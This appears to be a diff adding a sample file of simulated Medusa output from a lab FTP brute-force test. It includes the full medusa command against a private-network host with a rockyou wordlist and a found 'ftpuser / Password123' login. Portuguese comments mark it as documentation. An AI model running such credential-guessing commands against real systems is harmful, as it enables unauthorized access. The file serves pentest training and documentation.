@@ -1,0 +1,18 @@
+# Medusa 2.2 - FTP brute force example (simulated output)
+# Comando usado:
+# medusa -h 192.168.56.101 -M ftp -u ftpuser -P wordlists/rockyou_small.txt -t 4 -f -O outputs/medusa_ftp.txt
+# Data/hora: Sun Oct 18 17:05:00 2025
+
+[INFO] Starting Medusa v2.2
+[INFO] Module ftp loaded.
+[INFO] Target: 192.168.56.101:21
+[INFO] Using user: ftpuser
+[INFO] Password list: wordlists/rockyou_small.txt
+[INFO] Threads: 4
+[+] 192.168.56.101:21 - ftp - SUCCESS: ftpuser:Password123
+[+] Valid credentials found: ftpuser / Password123
+[INFO] Stopping on first valid login (flag -f set)
+[INFO] Results written to outputs/medusa_ftp.txt
+
+# Observação: este é um arquivo de exemplo para fins de documentação. 
+# Em um teste real, valide as credenciais com um cliente FTP (ex.: ftp, lftp ou curl).
